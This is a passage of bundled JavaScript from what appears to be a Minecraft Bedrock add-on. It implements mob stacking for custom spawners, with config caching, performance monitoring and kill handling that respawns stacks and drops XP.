        for (const mobType of validMobs2) {
          const entities = dim.getEntities({ type: mobType });
          entities.forEach((entity) => {
            if (entity?.isValid) {
              physicalCount++;
              if (entity.nameTag && entity.nameTag.includes("x")) {
                const match = entity.nameTag.match(/x(\d+)/);
                const count = match ? parseInt(match[1], 10) : 1;
                virtualCount += count;
              } else {
                virtualCount += 1;
              }
            }
          });
        }
      }
    } catch (e) {
    }
  }
  spawnerStatistics.totalSpawners = spawnerCount;
  spawnerStatistics.totalEntities = physicalCount;
  spawnerStatistics.totalVirtualEntities = virtualCount;
  spawnerStatistics.lastStatsUpdate = Date.now();
}
var PERFORMANCE_THRESHOLDS = {
  MAX_PROCESSING_TIME: 50,
  // ms per tick
  MAX_ENTITIES_PER_TICK: 100,
  MEMORY_WARNING: 200,
  // High memory usage threshold
  MEMORY_CRITICAL: 400,
  // Critical memory usage threshold
  SPAWN_TIME_WARNING: 10,
  // seconds
  CLEANUP_TIME_WARNING: 5
  // seconds
};
function getMemoryUsage() {
  const baseChunkLoad = ACTIVE_CHUNKS.size * 10;
  const entityLoad = entitySpawnerMap.size * 2;
  const timerLoad = (lastSpawnTime.size + lastKilled.size) * 1;
  const cacheLoad = Math.min(cacheManager.getStats().config?.size || 0, 20);
  return baseChunkLoad + entityLoad + timerLoad + cacheLoad;
}
function checkPerformanceHealth() {
  const memoryUsage = getMemoryUsage();
  performanceMetrics.peakMemoryUsage = Math.max(performanceMetrics.peakMemoryUsage, memoryUsage);
  if (memoryUsage > PERFORMANCE_THRESHOLDS.MEMORY_CRITICAL) {
    debugLog2(`[PERFORMANCE] CRITICAL: High memory usage detected: ${memoryUsage} units`);
    performanceMetrics.criticalCount++;
  } else if (memoryUsage > PERFORMANCE_THRESHOLDS.MEMORY_WARNING) {
    debugLog2(`[PERFORMANCE] WARNING: Elevated memory usage: ${memoryUsage} units`);
    performanceMetrics.warningCount++;
  }
  const entityCount = lastSpawnTime.size + lastKilled.size;
  if (entityCount > PERFORMANCE_THRESHOLDS.MAX_ENTITIES_PER_TICK * 10) {
    debugLog2(`[PERFORMANCE] WARNING: High entity tracking count: ${entityCount}`);
  }
}
function logPerformanceReport() {
  const memoryUsage = getMemoryUsage();
  const cacheStats = cacheManager.getStats();
  debugLog2(`[PERFORMANCE REPORT]
    Memory Usage: ${memoryUsage} units (Peak: ${performanceMetrics.peakMemoryUsage})
    Maps - SpawnTime: ${lastSpawnTime.size}, Killed: ${lastKilled.size}, Deaths: ${processedDeaths.size}
    Chunks: ${ACTIVE_CHUNKS.size}
    Cache - Config: ${cacheStats.config?.size || 0}
    Warnings: ${performanceMetrics.warningCount}, Critical: ${performanceMetrics.criticalCount}
    Operations: ${performanceMetrics.stackingOperations}`);
}
system4.runInterval(() => {
  const now = Date.now();
  const elapsedMinutes = (now - performanceMetrics.lastReset) / 6e4;
  if (elapsedMinutes >= 5) {
    logPerformanceReport();
    performanceMetrics.lastReset = now;
    performanceMetrics.averageProcessingTime = 0;
    performanceMetrics.stackingOperations = 0;
    performanceMetrics.entitySpawns = 0;
    performanceMetrics.entityRemovals = 0;
    performanceMetrics.warningCount = 0;
    performanceMetrics.criticalCount = 0;
  }
  checkPerformanceHealth();
}, 300 * 20);
var configDatabase2 = new Database("ConfigValues");
var xpDropDatabase = new Database("XPDropValues");
var spawnerDatabase2 = new Database("SpawnerLocations");
var UnifiedCacheManager = class {
  constructor() {
    __publicField(this, "caches", /* @__PURE__ */ new Map());
    __publicField(this, "cacheConfigs", /* @__PURE__ */ new Map());
    this.caches = /* @__PURE__ */ new Map();
    this.cacheConfigs = /* @__PURE__ */ new Map();
  }
  // Register a cache with specific configuration
  registerCache(cacheName, duration, maxSize = null) {
    this.caches.set(cacheName, /* @__PURE__ */ new Map());
    this.cacheConfigs.set(cacheName, { duration, maxSize, lastUpdate: 0 });
  }
  // Get cached value with automatic refresh
  get(cacheName, key, fetchFunction, defaultValue = null) {
    const cache = this.caches.get(cacheName);
    const config = this.cacheConfigs.get(cacheName);
    if (!cache || !config)
      return defaultValue;
    const now = Date.now();
    if (now - config.lastUpdate > config.duration || !cache.has(key)) {
      config.lastUpdate = now;
      const value = fetchFunction();
      cache.set(key, value);
      if (config.maxSize && cache.size > config.maxSize) {
        const entries = Array.from(cache.entries());
        const toRemove = entries.slice(0, cache.size - config.maxSize);
        toRemove.forEach(([k]) => cache.delete(k));
      }
    }
    return cache.get(key) ?? defaultValue;
  }
  // Manual cache update
  set(cacheName, key, value) {
    const cache = this.caches.get(cacheName);
    if (cache) {
      cache.set(key, value);
    }
  }
  // Clear specific cache
  clearCache(cacheName) {
    const cache = this.caches.get(cacheName);
    if (cache) {
      cache.clear();
    }
  }
  // Get cache statistics
  getStats() {
    const stats = {};
    for (const [name, cache] of this.caches.entries()) {
      stats[name] = {
        size: cache.size,
        config: this.cacheConfigs.get(name)
      };
    }
    return stats;
  }
};
var cacheManager = new UnifiedCacheManager();
cacheManager.registerCache("config", 3e4);
cacheManager.registerCache("entity", 5e3, 100);
cacheManager.registerCache("xpDrop", 6e4);
function validateAndClampConfig(key, value, defaultValue) {
  switch (key) {
    case "stackRadius":
      return Math.max(VALIDATION.MIN_RADIUS, Math.min(VALIDATION.MAX_RADIUS, value || defaultValue));
    case "itemSpillCap":
      return Math.max(1, Math.min(ENTITIES.MAX_ITEM_SPILL_CAP, value || defaultValue));
    case "xpSpillCap":
      return Math.max(1, Math.min(ENTITIES.MAX_XP_SPILL_CAP, value || defaultValue));
    default:
      return value || defaultValue;
  }
}
function getCachedConfig2(key, defaultValue) {
  return cacheManager.get(
    "config",
    key,
    () => {
      const rawConfigs = {
        "stackRadius": configDatabase2.read("stackRadius"),
        "playerKillOnly": configDatabase2.read("playerKillOnly"),
        "itemSpillCap": configDatabase2.read("itemSpillCap"),
        "xpSpillCap": configDatabase2.read("xpSpillCap")
      };
      const configs = {
        "stackRadius": validateAndClampConfig("stackRadius", rawConfigs.stackRadius, UI.DEFAULT_STACK_RADIUS),
        "playerKillOnly": rawConfigs.playerKillOnly ?? false,
        "itemSpillCap": validateAndClampConfig("itemSpillCap", rawConfigs.itemSpillCap, ENTITIES.DEFAULT_ITEM_SPILL_CAP),
        "xpSpillCap": validateAndClampConfig("xpSpillCap", rawConfigs.xpSpillCap, ENTITIES.DEFAULT_XP_SPILL_CAP)
      };
      return configs[key];
    },
    defaultValue
  );
}
globalThis.updateMobstackerCache = function(key, value) {
  cacheManager.set("config", key, value);
};
var SMALLEST_INTERVAL = TIMING.SMALLEST_INTERVAL;
var lastSpawnTime = /* @__PURE__ */ new Map();
var lastKilled = /* @__PURE__ */ new Map();
var cooldownMillis = TIMING.COOLDOWN_MILLIS;
var nameTagConfig = UI.NAME_TAG_CONFIG;
var processedDeaths = /* @__PURE__ */ new Set();
var MAP_MEMORY_LIMITS = {
  LAST_SPAWN_TIME: 5e3,
  // Max 5000 spawn time entries
  LAST_KILLED: 3e3,
  // Max 3000 kill time entries
  PROCESSED_DEATHS: 1e3,
  // Max 1000 processed death IDs
  ENTITY_SPAWNER_MAP: 1e4
  // Max 10000 entity-spawner mappings
};
var MEMORY_CLEANUP_INTERVAL = 12e3;
var ENTRY_MAX_AGE = 30 * 60 * 1e3;
var validMobs = [
  { typeId: "mrleefy:blazestill", displayName: "Blaze" },
  { typeId: "mrleefy:cowstill", displayName: "Cow" },
  { typeId: "mrleefy:sheepstill", displayName: "Sheep" },
  { typeId: "mrleefy:pigstill", displayName: "Pig" },
  { typeId: "mrleefy:chickenstill", displayName: "Chicken" },
  { typeId: "mrleefy:emeraldgolemstill", displayName: "Emerald Golem" },
  { typeId: "mrleefy:netheritegolemstill", displayName: "Netherite Golem" },
  { typeId: "mrleefy:irongolemstill", displayName: "Iron Golem" },
  { typeId: "mrleefy:diamondgolemstill", displayName: "Diamond Golem" },
  { typeId: "mrleefy:goldgolemstill", displayName: "Gold Golem" },
  { typeId: "mrleefy:endermanstill", displayName: "Enderman" },
  { typeId: "mrleefy:creeperstill", displayName: "Creeper" },
  { typeId: "mrleefy:magmacubestill", displayName: "MagmaCube" },
  { typeId: "mrleefy:guardianstill", displayName: "Guardian" },
  { typeId: "mrleefy:witherskeletonstill", displayName: "Wither Skeleton" },
  { typeId: "mrleefy:zombiestill", displayName: "Zombie" },
  { typeId: "mrleefy:villagerstill", displayName: "Villager" },
  { typeId: "mrleefy:witherstill", displayName: "Wither" },
  { typeId: "mrleefy:enderdragonstill", displayName: "Ender Dragon" },
  { typeId: "mrleefy:spiderstill", displayName: "Spider" },
  { typeId: "mrleefy:slimestill", displayName: "Slime" },
  { typeId: "mrleefy:vindicatorstill", displayName: "Vindicator" },
  { typeId: "mrleefy:skeletonstill", displayName: "Skeleton" },
  { typeId: "mrleefy:shulkerstill", displayName: "Shulker" },
  { typeId: "mrleefy:breezestill", displayName: "Breeze" },
  { typeId: "mrleefy:piglinbrutestill", displayName: "PiglinBrute" },
  { typeId: "mrleefy:wardenstill", displayName: "Warden" },
  { typeId: "mrleefy:ravagerstill", displayName: "Ravager" },
  { typeId: "mrleefy:snowmanstill", displayName: "Snow Golem" },
  // --- Crawlers ---
  { typeId: "mrleefy:coalcrawlerstill", displayName: "Coal Crawler" },
  { typeId: "mrleefy:glowstonecrawlerstill", displayName: "Glowstone Crawler" },
  { typeId: "mrleefy:obsidiancrawlerstill", displayName: "Obsidian Crawler" },
  { typeId: "mrleefy:icecrawlerstill", displayName: "Ice Crawler" },
  { typeId: "mrleefy:spongecrawlerstill", displayName: "Sponge Crawler" },
  { typeId: "mrleefy:lapiscrawlerstill", displayName: "Lapis Crawler" },
  { typeId: "mrleefy:redstonecrawlerstill", displayName: "Redstone Crawler" },
  { typeId: "mrleefy:coppercrawlerstill", displayName: "Copper Crawler" },
  { typeId: "mrleefy:quartzcrawlerstill", displayName: "Quartz Crawler" },
  { typeId: "mrleefy:amethystcrawlerstill", displayName: "Amethyst Crawler" }
];
var mobDisplayNameMap = new Map(validMobs.map((m) => [m.typeId, m.displayName]));
function extractStackNumber(nameTag) {
  const match = nameTag?.match(/x(\d+)/);
  return match ? parseInt(match[1], 10) : 1;
}
var validEntityTypes = new Set(validMobs.map((mob) => mob.typeId));
var CHUNK_SIZE2 = 16;
var ACTIVE_CHUNKS = /* @__PURE__ */ new Map();
var CHUNK_CACHE_DURATION = 6e4;
var lastChunkUpdate = 0;
function getChunkKey(x, z) {
  const chunkX = Math.floor(x / CHUNK_SIZE2);
  const chunkZ = Math.floor(z / CHUNK_SIZE2);
  return `${chunkX},${chunkZ}`;
}
function updateActiveChunks(spawnruleEntities) {
  const now = Date.now();
  if (now - lastChunkUpdate < CHUNK_CACHE_DURATION)
    return;
  ACTIVE_CHUNKS.clear();
  const MAX_CHUNKS = 500;
  let chunkCount = 0;
  for (const entity of spawnruleEntities) {
    if (entity?.isValid && entity.location && chunkCount < MAX_CHUNKS) {
      const chunkKey = getChunkKey(entity.location.x, entity.location.z);
      if (!ACTIVE_CHUNKS.has(chunkKey)) {
        ACTIVE_CHUNKS.set(chunkKey, []);
        chunkCount++;
      }
      ACTIVE_CHUNKS.get(chunkKey).push(entity);
    }
  }
  lastChunkUpdate = now;
}
var consecutiveErrors = 0;
var MAX_CONSECUTIVE_ERRORS = 5;
function getPerformanceConfig() {
  return {
    PLAYER_ACTIVATION_RADIUS: configDatabase2.read("performanceActivationRadius") || 50,
    MAX_SPAWNS_PER_CYCLE: configDatabase2.read("performanceMaxSpawns") || 25,
    SPAWN_INTERVAL_TICKS: configDatabase2.read("performanceSpawnInterval") || 20,
    INITIAL_DELAY_RANDOM: configDatabase2.read("performanceRandomDelay") ?? true,
    MAXED_SPAWNER_RECHECK_MS: 3e4
    // 30 seconds backup check
  };
}
var maxedSpawners = /* @__PURE__ */ new Map();
var entitySpawnerOwnership = /* @__PURE__ */ new Map();
function clearMaxedSpawnerCache(x, y, z) {
  const spawnerKey = `${Math.floor(x)},${Math.floor(y)},${Math.floor(z)}`;
  for (const [key] of maxedSpawners) {
    if (key.endsWith(`:${spawnerKey}`)) {
      maxedSpawners.delete(key);
      debugLog2(`Cleared maxed cache for: ${key}`);
    }
  }
}
function clearSpawnerParseCache() {
  spawnerParseCache.clear();
  debugLog2(`[AASettings] Spawner spec cache cleared \u2014 all spawners will re-read updated settings on next tick.`);
}
var isProcessingJobRunning = false;
var spawnerParseCache = /* @__PURE__ */ new Map();
function getSpawnerSpecs(nameTag) {
  let specs = spawnerParseCache.get(nameTag);
  if (specs !== void 0)
    return specs;
  const parsedName = nameTag.replace(
    /(_)|(spawner)/gi,
    (match) => match === "_" ? "" : match.toLowerCase() === "spawner" ? "still" : ""
  );
  const matches = parsedName.match(/(?<entityType>[a-zA-Z]+)(?<level>\d{1,2})/);
  if (!matches || !matches.groups) {
    spawnerParseCache.set(nameTag, null);
    return null;
  }
  const { entityType, level } = matches.groups;
  const entityTypeId = `mrleefy:${entityType}`;
  const levelNum = parseInt(level, 10);
  if (!validEntityTypes.has(entityTypeId)) {
    spawnerParseCache.set(nameTag, null);
    return null;
  }
  const displayName = mobDisplayNameMap.get(entityTypeId);
  if (!displayName) {
    spawnerParseCache.set(nameTag, null);
    return null;
  }
  const { qty, speed, maxStack } = getAAValueForLevel(levelNum);
  if (qty === 0) {
    spawnerParseCache.set(nameTag, null);
    return null;
  }
  specs = { entityTypeId, levelNum, qty, speed, maxStack, displayName };
  spawnerParseCache.set(nameTag, specs);
  return specs;
}
function* spawnerProcessingJob() {
  try {
    const startTime = Date.now();
    let tickStartTime = startTime;
    const overworld = world5.getDimension("overworld");
    const radius = getCachedConfig2("stackRadius", UI.DEFAULT_STACK_RADIUS);
    const spawnruleEntities = overworld.getEntities({ type: ENTITIES.SPAWNRULE_ENTITY_TYPE });
    updateActiveChunks(spawnruleEntities);
    if (spawnruleEntities.length === 0) {
      return;
    }
    const perfConfig = getPerformanceConfig();
    const activePlayers = overworld.getPlayers();
    const playerRadiusSq = perfConfig.PLAYER_ACTIVATION_RADIUS * perfConfig.PLAYER_ACTIVATION_RADIUS;
    let spawnsThisCycle = 0;
    let processedCount = 0;
    let skippedNoPlayers = 0;
    let skippedMaxed = 0;
    for (const spawnruleEntity of spawnruleEntities) {
      if (Date.now() - tickStartTime > 4) {
        yield;
        tickStartTime = Date.now();
      }
      if (!spawnruleEntity?.isValid)
        continue;
      const location = spawnruleEntity.location;
      let playerNear = false;
      for (const player of activePlayers) {
        if (!player.isValid)
          continue;
        const pLoc = player.location;
        const dx = pLoc.x - location.x;
        const dy = pLoc.y - location.y;
        const dz = pLoc.z - location.z;
        if (dx * dx + dy * dy + dz * dz <= playerRadiusSq) {
          playerNear = true;
          break;
        }
      }
      if (!playerNear) {
        skippedNoPlayers++;
        continue;
      }
      const nameTag = spawnruleEntity.nameTag;
      if (!nameTag)
        continue;
      const specs = getSpawnerSpecs(nameTag);
      if (!specs)
        continue;
      const { entityTypeId, levelNum, qty, speed, maxStack, displayName } = specs;
      const spawnerKey = `${Math.floor(location.x)},${Math.floor(location.y)},${Math.floor(location.z)}`;
      const spawnKey = `${entityTypeId}:${spawnerKey}`;
      const now = Date.now();
      if (maxedSpawners.has(spawnKey)) {
        const lastMaxedCheck = maxedSpawners.get(spawnKey);
        if (now - lastMaxedCheck < perfConfig.MAXED_SPAWNER_RECHECK_MS) {
          skippedMaxed++;
          continue;
        }
      }
      const lastSpawn = lastSpawnTime.get(spawnKey) || 0;
      const lastKill = lastKilled.get(spawnKey) || 0;
      const speedMillis = speed * 1e3;
      if (lastSpawn === 0 && perfConfig.INITIAL_DELAY_RANDOM) {
        const randomDelay = Math.random() * speedMillis;
        lastSpawnTime.set(spawnKey, now - randomDelay);
        continue;
      }
      if (now - lastSpawn < speedMillis)
        continue;
      if (now - lastKill < cooldownMillis)
        continue;
      if (spawnsThisCycle >= perfConfig.MAX_SPAWNS_PER_CYCLE) {
        continue;
      }
      if (!spawnruleEntity.isValid)
        continue;
      let nearbyEntities;
      try {
        nearbyEntities = overworld.getEntities({
          type: entityTypeId,
          location,
          maxDistance: radius
        });
      } catch (err) {
        continue;
      }
      lastSpawnTime.set(spawnKey, now);
      let primaryEntity = null;
      let maxStackInArea = 0;
      let totalStack = 0;
      const extras = [];
      for (const entity of nearbyEntities) {
        if (!entity || !entity.isValid)
          continue;
        const stackSize = extractStackNumber(entity.nameTag || "");
        totalStack += stackSize;
        if (stackSize > maxStackInArea) {
          if (primaryEntity)
            extras.push(primaryEntity);
          maxStackInArea = stackSize;
          primaryEntity = entity;
        } else {
          extras.push(entity);
        }
      }
      for (const entity of extras) {
        try {
          if (entity.isValid) {
            entitySpawnerMap.delete(entity.id);
            entitySpawnerOwnership.delete(entity.id);
            entity.remove();
            performanceMetrics.entityRemovals++;
          }
        } catch (error) {
          debugLog2(`Failed to remove entity: ${error.message}`);
        }
      }
      if (primaryEntity && primaryEntity.isValid) {
        const newStackSize = Math.min(totalStack + qty, maxStack);
        const currentStack = extractStackNumber(primaryEntity.nameTag || "");
        if (currentStack !== newStackSize) {
          try {
            primaryEntity.nameTag = nameTagConfig.replace("#", newStackSize.toString()).replace("@", displayName);
          } catch (err) {
            debugLog2(`Failed to update primary entity nameTag: ${err.message}`);
          }
        }
        if (newStackSize >= maxStack) {
          maxedSpawners.set(spawnKey, now);
          entitySpawnerOwnership.set(primaryEntity.id, spawnKey);
        } else {
          maxedSpawners.delete(spawnKey);
        }
      } else {
        spawnNewStackedEntity(overworld, entityTypeId, location, qty, displayName);
        spawnsThisCycle++;
        maxedSpawners.delete(spawnKey);
      }
      processedCount++;
    }
    performanceMetrics.stackingOperations++;
    const processingTime = Date.now() - startTime;
    debugLog2(`Spawner cycle: processed=${processedCount}, spawned=${spawnsThisCycle}, skippedNoPlayers=${skippedNoPlayers}, skippedMaxed=${skippedMaxed}, time=${processingTime}ms`);
    if (processingTime > PERFORMANCE_THRESHOLDS.MAX_PROCESSING_TIME) {
      debugLog2(`[PERFORMANCE] Slow processing: ${processingTime}ms`);
      performanceMetrics.warningCount++;
    }
    performanceMetrics.averageProcessingTime = performanceMetrics.averageProcessingTime === 0 ? processingTime : performanceMetrics.averageProcessingTime * 0.95 + processingTime * 0.05;
  } catch (error) {
    console.error(`[MOBSTACKER] Error in spawner job:`, error);
  } finally {
    isProcessingJobRunning = false;
  }
}
var stackingIntervalFunction = () => {
  if (isProcessingJobRunning) {
    debugLog2("[MOBSTACKER] Stacking interval skipped - previous job still running");
    return;
  }
  try {
    isProcessingJobRunning = true;
    system4.runJob(spawnerProcessingJob());
    consecutiveErrors = 0;
  } catch (error) {
    isProcessingJobRunning = false;
    consecutiveErrors++;
    console.error(`[MOBSTACKER] Stacking error (attempt ${consecutiveErrors}/${MAX_CONSECUTIVE_ERRORS}):`, error);
    if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
      debugLog2(`[MOBSTACKER] Too many consecutive errors`);
    }
    performanceMetrics.criticalCount++;
  }
};
var activeInterval;
system4.run(() => {
  system4.run(() => {
    const perfConfig = getPerformanceConfig();
    activeInterval = system4.runInterval(stackingIntervalFunction, perfConfig.SPAWN_INTERVAL_TICKS);
  });
});
function enforceMapLimits() {
  const now = Date.now();
  const cutoffTime = now - ENTRY_MAX_AGE;
  if (lastSpawnTime.size > MAP_MEMORY_LIMITS.LAST_SPAWN_TIME) {
    let toRemoveCount = lastSpawnTime.size - MAP_MEMORY_LIMITS.LAST_SPAWN_TIME;
    for (const key of lastSpawnTime.keys()) {
      if (toRemoveCount <= 0)
        break;
      lastSpawnTime.delete(key);
      toRemoveCount--;
    }
  }
  for (const [key, timestamp] of lastSpawnTime.entries()) {
    if (timestamp < cutoffTime) {
      lastSpawnTime.delete(key);
    }
  }
  if (lastKilled.size > MAP_MEMORY_LIMITS.LAST_KILLED) {
    let toRemoveCount = lastKilled.size - MAP_MEMORY_LIMITS.LAST_KILLED;
    for (const key of lastKilled.keys()) {
      if (toRemoveCount <= 0)
        break;
      lastKilled.delete(key);
      toRemoveCount--;
    }
  }
  for (const [key, timestamp] of lastKilled.entries()) {
    if (timestamp < cutoffTime) {
      lastKilled.delete(key);
    }
  }
  if (processedDeaths.size > MAP_MEMORY_LIMITS.PROCESSED_DEATHS) {
    let toRemoveCount = processedDeaths.size - MAP_MEMORY_LIMITS.PROCESSED_DEATHS;
    for (const value of processedDeaths.values()) {
      if (toRemoveCount <= 0)
        break;
      processedDeaths.delete(value);
      toRemoveCount--;
    }
  }
  if (entitySpawnerMap.size > MAP_MEMORY_LIMITS.ENTITY_SPAWNER_MAP) {
    let toRemoveCount = entitySpawnerMap.size - MAP_MEMORY_LIMITS.ENTITY_SPAWNER_MAP;
    for (const key of entitySpawnerMap.keys()) {
      if (toRemoveCount <= 0)
        break;
      entitySpawnerMap.delete(key);
      toRemoveCount--;
    }
  }
  if (entitySpawnerOwnership.size > MAP_MEMORY_LIMITS.ENTITY_SPAWNER_MAP) {
    let toRemoveCount = entitySpawnerOwnership.size - MAP_MEMORY_LIMITS.ENTITY_SPAWNER_MAP;
    for (const key of entitySpawnerOwnership.keys()) {
      if (toRemoveCount <= 0)
        break;
      entitySpawnerOwnership.delete(key);
      toRemoveCount--;
    }
  }
  if (maxedSpawners.size > 2e3) {
    let toRemoveCount = maxedSpawners.size - 2e3;
    for (const key of maxedSpawners.keys()) {
      if (toRemoveCount <= 0)
        break;
      maxedSpawners.delete(key);
      toRemoveCount--;
    }
  }
  if (spawnerParseCache.size > 1e3) {
    let toRemoveCount = spawnerParseCache.size - 1e3;
    for (const key of spawnerParseCache.keys()) {
      if (toRemoveCount <= 0)
        break;
      spawnerParseCache.delete(key);
      toRemoveCount--;
    }
  }
}
system4.runInterval(() => {
  try {
    enforceMapLimits();
  } catch (error) {
    console.error("Memory cleanup error:", error);
  }
}, MEMORY_CLEANUP_INTERVAL);
function spawnNewStackedEntity(dimension, entityTypeId, location, qty, displayName) {
  try {
    const spawnLocation = {
      x: location.x,
      y: location.y + 0.5,
      z: location.z
    };
    const newEntity = dimension.spawnEntity(entityTypeId, spawnLocation);
    if (newEntity?.isValid) {
      newEntity.nameTag = nameTagConfig.replace("#", qty.toString()).replace("@", displayName);
      const spawnerKey = `${Math.floor(location.x)},${Math.floor(location.y)},${Math.floor(location.z)}`;
      entitySpawnerMap.set(newEntity.id, spawnerKey);
      performanceMetrics.entitySpawns++;
    }
  } catch (error) {
    console.error(`Failed to spawn entity ${entityTypeId}: ${error}`);
  }
}
var lastCleanupSize = 0;
var cleanupInterval = system4.runInterval(() => {
  const currentSize = processedDeaths.size;
  if (currentSize > 0) {
    processedDeaths.clear();
    if (currentSize > 100 && lastCleanupSize > 100) {
      system4.clearRun(cleanupInterval);
      cleanupInterval = system4.runInterval(() => {
        if (processedDeaths.size > 0)
          processedDeaths.clear();
      }, 300);
    }
  }
  lastCleanupSize = currentSize;
}, 600);
if (!globalThis.__stackDieSubscribed) {
  globalThis.__stackDieSubscribed = true;
  world5.afterEvents.entityDie.subscribe((event) => {
    const { deadEntity } = event;
    if (deadEntity && validEntityTypes.has(deadEntity.typeId)) {
      entitySpawnerMap.delete(deadEntity.id);
      const spawnerKey = entitySpawnerOwnership.get(deadEntity.id);
      if (spawnerKey) {
        maxedSpawners.delete(spawnerKey);
        entitySpawnerOwnership.delete(deadEntity.id);
        debugLog2(`Spawner reactivated (death): ${spawnerKey}`);
      }
    }
  });
  world5.afterEvents.entityHurt.subscribe((event) => {
    try {
      const { hurtEntity, damageSource } = event;
      if (!hurtEntity?.isValid)
        return;
      const health = hurtEntity.getComponent("health");
      if (!health || health.currentValue > 0) {
        const ownerSpawnKey2 = entitySpawnerOwnership.get(hurtEntity.id);
        if (ownerSpawnKey2 && maxedSpawners.has(ownerSpawnKey2)) {
          maxedSpawners.delete(ownerSpawnKey2);
          debugLog2(`Spawner reactivated (hurt): ${ownerSpawnKey2}`);
        }
        return;
      }
      if (processedDeaths.has(hurtEntity.id))
        return;
      processedDeaths.add(hurtEntity.id);
      const entityTypeId = hurtEntity.typeId;
      if (!validEntityTypes.has(entityTypeId)) {
        return;
      }
      const spawnerKey = entitySpawnerMap.get(hurtEntity.id);
      const loc = hurtEntity.location;
      const spawnerKeyFallback = `${Math.floor(loc.x)},${Math.floor(loc.y)},${Math.floor(loc.z)}`;
      const finalSpawnerKey = spawnerKey || spawnerKeyFallback;
      const killer = damageSource?.damagingEntity;
      const killerPlayer = killer?.typeId === "minecraft:player" ? killer : void 0;
      updateSpawnerStatisticsDirect(entityTypeId, finalSpawnerKey, killerPlayer);
      debugLog2(`Tracked kill: ${entityTypeId} at ${finalSpawnerKey}`);
      const ownerSpawnKey = entitySpawnerOwnership.get(hurtEntity.id);
      if (ownerSpawnKey) {
        maxedSpawners.delete(ownerSpawnKey);
        entitySpawnerOwnership.delete(hurtEntity.id);
        debugLog2(`Spawner reactivated (death): ${ownerSpawnKey}`);
      }
      const inheritedSpawnerKey = entitySpawnerMap.get(hurtEntity.id);
      entitySpawnerMap.delete(hurtEntity.id);
      if (!entityTypeId) {
        debugLog2("Entity hurt event received without valid typeId");
        return;
      }
      const displayName = mobDisplayNameMap.get(entityTypeId);
      if (!displayName)
        return;
      const locKey = `${hurtEntity.location.x.toFixed(0)},${hurtEntity.location.y.toFixed(0)},${hurtEntity.location.z.toFixed(0)}`;
      lastKilled.set(`${entityTypeId}:${locKey}`, Date.now());
      const currentAmount = extractStackNumber(hurtEntity.nameTag);
      if (currentAmount > 1) {
        try {
          const oldRotation = hurtEntity.getRotation();
          const oldLocation = hurtEntity.location;
          if (!oldLocation || typeof oldLocation.x !== "number") {
            console.error(`Invalid location data for entity ${entityTypeId}`);
            return;
          }
          const newEntity = hurtEntity.dimension.spawnEntity(entityTypeId, oldLocation);
          if (newEntity && newEntity.isValid) {
            newEntity.nameTag = nameTagConfig.replace("#", (currentAmount - 1).toString()).replace("@", displayName);
            newEntity.setRotation(oldRotation);
            if (inheritedSpawnerKey) {
              entitySpawnerMap.set(newEntity.id, inheritedSpawnerKey);
            }
          } else {
            console.error(`Failed to spawn replacement entity for ${entityTypeId}`);
          }
        } catch (e) {
          console.error(`Failed to respawn stacked entity: ${e}`);
        }
      }
      try {
        const playerKillOnly = getCachedConfig2("playerKillOnly", false);
        if (playerKillOnly && (!killer || killer.typeId !== "minecraft:player"))
          return;
        const xpSpillCap = getCachedConfig2("xpSpillCap", ENTITIES.DEFAULT_XP_SPILL_CAP);
        if (hurtEntity.dimension.getEntities({ type: ENTITIES.XP_ORB_TYPE, location: hurtEntity.location, maxDistance: 3, closest: xpSpillCap }).length < xpSpillCap) {
          const xpConfig = cacheManager.get("xpDrop", entityTypeId, () => xpDropDatabase.read(entityTypeId));
          if (xpConfig && Math.random() * 100 < (xpConfig.chance ?? 100)) {
            try {
              hurtEntity.dimension.spawnEntity(ENTITIES.XP_ORB_TYPE, hurtEntity.location, { amount: xpConfig.amount ?? 1 });
            } catch (e) {
              console.error(`Error spawning XP orb for ${entityTypeId}: ${e}`);
            }
          }
        }
      } catch (e) {
        console.error(`Error in loot logic for ${entityTypeId}: ${e}`);
      }
    } catch (error) {
      console.error(`Critical error in entity hurt handler: ${error}`);
    }
  });
}

// src/performance-monitor.ts
var PerformanceMonitor = class {
  constructor() {
    __publicField(this, "metrics");
    __publicField(this, "timingStack");
    __publicField(this, "alerts");
    __publicField(this, "thresholds");
    __publicField(this, "_intervalId");
    this.metrics = {
      stackingOperations: 0,
      entitySpawns: 0,
      entityRemovals: 0,
      averageProcessingTime: 0,
      lootDrops: 0,
      databaseReads: 0,
      databaseWrites: 0,
      cacheHits: 0,
      cacheMisses: 0,
      errors: 0,
      lastReset: Date.now()
    };
    this.timingStack = /* @__PURE__ */ new Map();
    this.alerts = [];
    this.thresholds = {
      maxProcessingTime: 50,
      // ms
      maxErrorsPerMinute: 10,
      maxMemoryUsage: PERFORMANCE.MAX_MAP_SIZE
    };
    this.startPeriodicMonitoring();
  }
  /**
   * Start timing for an operation
   * @param operation - Operation name
   * @returns Timer ID
   */
  startTiming(operation) {
    const timerId = `${operation}_${Date.now()}_${Math.random()}`;
    this.timingStack.set(timerId, Date.now());
    return timerId;
  }
  /**
   * End timing for an operation and record the duration
   * @param timerId - Timer ID from startTiming
   * @param operation - Operation name (fallback)
   * @returns Duration in milliseconds
   */
  endTiming(timerId, operation = "unknown") {
    const startTime = this.timingStack.get(timerId);
    if (!startTime) {
      debugLog2(`PerformanceMonitor: Timer not found for ${timerId}`);
      return 0;
    }
    const duration = Date.now() - startTime;
    this.timingStack.delete(timerId);
    this.metrics.stackingOperations++;
    this.metrics.averageProcessingTime = (this.metrics.averageProcessingTime * (this.metrics.stackingOperations - 1) + duration) / this.metrics.stackingOperations;
    if (duration > this.thresholds.maxProcessingTime) {
      this.addAlert(`High processing time for ${operation}: ${duration.toFixed(2)}ms`);
    }
    return duration;
  }
  /**
   * Record a performance event
   * @param eventType - Type of event (e.g., 'entitySpawn', 'lootDrop')
   * @param value - Value to record (optional)
   */
  recordEvent(eventType, value = 1) {
    if (this.metrics.hasOwnProperty(eventType)) {
      this.metrics[eventType] += value;
    } else {
      debugLog2(`PerformanceMonitor: Unknown event type ${eventType}`);
    }
  }
  /**
   * Record a cache hit or miss
   * @param isHit - True for cache hit, false for cache miss
   */
  recordCacheAccess(isHit) {
    if (isHit) {
      this.metrics.cacheHits++;
    } else {
      this.metrics.cacheMisses++;
    }
  }
  /**
   * Record a database operation
   * @param operation - 'read' or 'write'
   * @param table - Table name (optional)
   */
  recordDatabaseOperation(operation, table = "unknown") {
    if (operation === "read") {
      this.metrics.databaseReads++;
    } else if (operation === "write") {
      this.metrics.databaseWrites++;
    }
  }
  /**
   * Record an error
   * @param errorType - Type of error
   * @param message - Error message
   */
  recordError(errorType, message) {
